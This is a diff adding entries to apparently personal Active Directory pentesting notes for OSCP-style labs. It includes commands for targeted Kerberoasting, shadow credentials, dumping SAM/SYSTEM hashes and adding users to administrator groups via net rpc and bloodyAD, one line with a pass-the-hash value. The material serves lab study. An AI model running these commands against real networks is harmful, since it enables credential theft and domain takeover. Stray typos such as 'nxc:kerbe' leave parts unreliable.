@@ -3,6 +3,7 @@
 
 - [Table of Content](#table-of-content)
 - [Useful links](#useful-links)
+    - [Scripts and tools tipically in /opt/tools](#scripts-and-tools-tipically-in-opttools)
 - [Enumeration](#enumeration)
     - [Tools](#tools)
         - [SMBclient recursively get all](#smbclient-recursively-get-all)
@@ -15,6 +16,7 @@
     - [Brute force](#brute-force)
     - [ASREP roast](#asrep-roast)
     - [Kerberoasting](#kerberoasting)
+    - [TargetedKerberoasting GenericWrite](#targetedkerberoasting-genericwrite)
     - [Kerberos Certificate Misconfiguration exploit](#kerberos-certificate-misconfiguration-exploit)
         - [ESC4](#esc4)
         - [ESC1](#esc1)
@@ -25,6 +27,8 @@
 - [Grant FullControl rights](#grant-fullcontrol-rights)
 - [Obtain system shell without EvilWinRM](#obtain-system-shell-without-evilwinrm)
 - [SAM / SYSTEM hashes dump](#sam--system-hashes-dump)
+- [Add user to a group Generic All](#add-user-to-a-group-generic-all)
+- [](#)
 - [notes from adri TODO](#notes-from-adri-todo)
 
 <!-- /TOC -->
@@ -36,12 +40,21 @@
  - [OSCP-like Labs and Machines](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)
  - [Kerberos Attacks explained](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
  - [InternalAllTheThings repository](https://swisskyrepo.github.io/InternalAllTheThings/)
+ - [BloodyAD guide](https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad)
+
+## Scripts and tools (tipically in /opt/tools)
+
+- [BloodHound GUI](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
+- [TargetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast/tree/main)
 
 # Enumeration
 search for:
 - shares
 - groups
 - RIDs
+- list Certificates
+- list ACL permissions
+- collect Bloodhound files
 
 
 try using default credentials like `guest` and no password\
@@ -51,7 +64,7 @@ repeat enumeration with any other users you find access to
 1. crackmapexec:
     - `crackmapexec smb {host} --shares {-u '' -p ''}`
     - `crackmapexec smb {host} --rid-brute`
-2. nxc:
+2. nxc:kerbe
     - `nxc smb {host} --shares {-u guest -p ''}`
     - `nxc ldap {host} {-M group-mem -o group="Remote Managment Users"}`
     - `nxc smb {host} --rid-brute`
@@ -123,6 +136,12 @@ To perform Kerberoasting, only a domain account that can request for TGSs is nec
 The goal is to search for users that are configured with a SPN, so this means that they act kind of as as Service for which we can requests a TGS to Kerberos, which will be encrypted with the user secret shared key (usually shorted than an actual service/machine password) so then try to crack it:
 - `impacket-GetUserSPNs {domain}/{user}:{password} {-request} {-userfile users.txt}`
 
+## TargetedKerberoasting (GenericWrite)
+
+can happen when you have some sort of privilege that lets you set a SPN for a specific user so that they become vulnerable to classic Kerberoasting
+- `targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword' --request-user 'target-user'`
+
+
 ## Kerberos Certificate Misconfiguration exploit
 
 Weak ACLs refer to access control entries (ACEs) that grant excessive permissions to unauthorized users or groups. hese permissions allow attackers to modify the template’s properties or even the ACL itself, potentially leading to domain escalation.
@@ -180,7 +199,8 @@ change owner of a user:
 `Set-DomainObjectOwner -TargetIdentity {target_user} -PrincipalIdentity {user}`
 
 # Certipy-AD
-when you already have a user you can try to extract hashes for other users:
+when you already have a user you can try to extract hashes for other users [learn more](https://www.hackingarticles.in/shadow-credentials-attack/):
+
 - `certipy-ad shadow auto -u '{user}@{domain}' -p "{password}" -account '{target_user}' -dc-ip '{ip}'`
 
 and also search for vulnerable certificates if you can access the CA_SVC account:
@@ -201,10 +221,19 @@ when there is no user in the "Remote Management Group" you can still obtain a sh
 
 # SAM / SYSTEM hashes dump
 
-with full access to filesystem, you can read and dump SAM (Security Account Manager) file which is a SB for hashes.\
+with full access to filesystem, you can read and dump SAM (Security Account Manager) file which is a DB for hashes.\
 Sometimes it is locked and impossible to access, but if you have a backup or a copy of it you can.
 
 - `secretsdump.py -sam {sam_file} -security {security_file} -system {system_file} {target}`
+
+# Add user to a group (Generic All)
+
+with Generic All permissions you can change your group membership.
+
+- `net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
+- `bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add groupMember 'Administrators' test`
+
+# 
 
 # notes from adri TODO
 
